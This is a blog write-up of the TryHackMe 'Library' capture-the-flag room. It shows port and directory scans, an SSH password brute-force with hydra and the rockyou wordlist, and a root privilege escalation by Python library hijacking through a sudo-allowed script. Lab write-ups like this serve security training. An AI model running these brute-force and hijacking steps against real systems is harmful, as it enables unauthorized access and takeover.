---
layout: post
title: "[THM] Library Writeup"
date: "2022-03-08"
categories: pentest
---

**Library** is a TryHackMe room boot2root machine for FIT and bsides guatemala CTF.

Link: [https://tryhackme.com/room/bsidesgtlibrary](https://tryhackme.com/room/bsidesgtlibrary)

## Recon Phase
### nmap
```bash
root@mirai:~# nmap -T4 -sC -sV -p- --min-rate=1000 10.10.85.187 -Pn
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-08 15:55 HKT
Nmap scan report for 10.10.85.187
Host is up (0.24s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 c4:2f:c3:47:67:06:32:04:ef:92:91:8e:05:87:d5:dc (RSA)
|   256 68:92:13:ec:94:79:dc:bb:77:02:da:99:bf:b6:9d:b0 (ECDSA)
|_  256 43:e8:24:fc:d8:b8:d3:aa:c2:48:08:97:51:dc:5b:7d (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome to  Blog - Library Machine
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 85.22 seconds
```

Since port 80 is open, lets do some passive recon on the website.

![](/static/img/thm-library-writeup/user1.png)
![](/static/img/thm-library-writeup/user2.png)

I listed down all the usernames I found in the website that is important for later use.
1. meliodas
2. root
3. www-data
4. Anonymous

Since there is no other webpages because menu bars is not clickable, lets scan for subdomains.

### gobuster

```bash
root@mirai:~# gobuster dir -u 10.10.85.187 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,txt,html --timeout 50s -t 170 -f
===============================================================
2022/03/08 01:36:48 Starting gobuster in directory enumeration mode
===============================================================
/images/              (Status: 200) [Size: 1640]
/icons/               (Status: 403) [Size: 292]
/index.html           (Status: 200) [Size: 5439]
/robots.txt           (Status: 200) [Size: 33]
```
Opening the `robots.txt` on the browser gives the following text.

![](/static/img/thm-library-writeup/rockyou.png)

"rockyou"??? Seems familiar because there's this famous wordlist named `rockyou.txt`, maybe its a hint for us to bruteforce something?

Lets try to bruteforce the port 22 (SSH) with hydra!

### hydra

```bash
hydra -L meliodas users -P /usr/share/wordlists/rockyou.txt ssh://10.10.85.187 -t 4
```

![](/static/img/thm-library-writeup/hydra.png)


Successfully cracked the credential with a password of `iloveyou1`

Login to the ssh and get the `user.txt` flag!

![](/static/img/thm-library-writeup/user3.png)

---

# Privilege Escalation: meliodas --> root

## python library hijacking 
As you can see when running `sudo -l` we can run the file `/home/meliodas/bak.py` which was owned by `root`.

![](/static/img/thm-library-writeup/sudo.png)

Lets analyze the code since we cannot modify the python file.

```python
#!/usr/bin/env python
import os
import zipfile

def zipdir(path, ziph):
    for root, dirs, files in os.walk(path):
        for file in files:
            ziph.write(os.path.join(root, file))

if __name__ == '__main__':
    zipf = zipfile.ZipFile('/var/backups/website.zip', 'w', zipfile.ZIP_DEFLATED)
    zipdir('/var/www/html', zipf)
    zipf.close()
```

The code seems not vunerable to any code injection. So, As I am searching python `zipfile` module exploits in google, I came across to this blog post [privilege escalation via python library hijacking](https://rastating.github.io/privilege-escalation-via-python-library-hijacking/).

Let's replicate what he did in the blog post.

- Create a file `os.py` in the same directory as `bak.py` and put the contents below.
	```python
	import pty
	pty.spawn('/bin/bash')
	```
- Run this command `sudo /usr/bin/python3 /home/meliodas/bak.py`
- see if it works

	![](/static/img/thm-library-writeup/os.png)

It doesnt work with os library, lets repeat the same steps and try it with `zipfile` library.

And we are now root!

![](/static/img/thm-library-writeup/root.png)

## Easiest way to gain root
1. Delete the `bak.py` file
2. Create a new one and put the contents below
	```python
	import pty
	pty.spawn('/bin/bash')
	```
	
3. and run it

![](/static/img/thm-library-writeup/root2.png)

Thank you!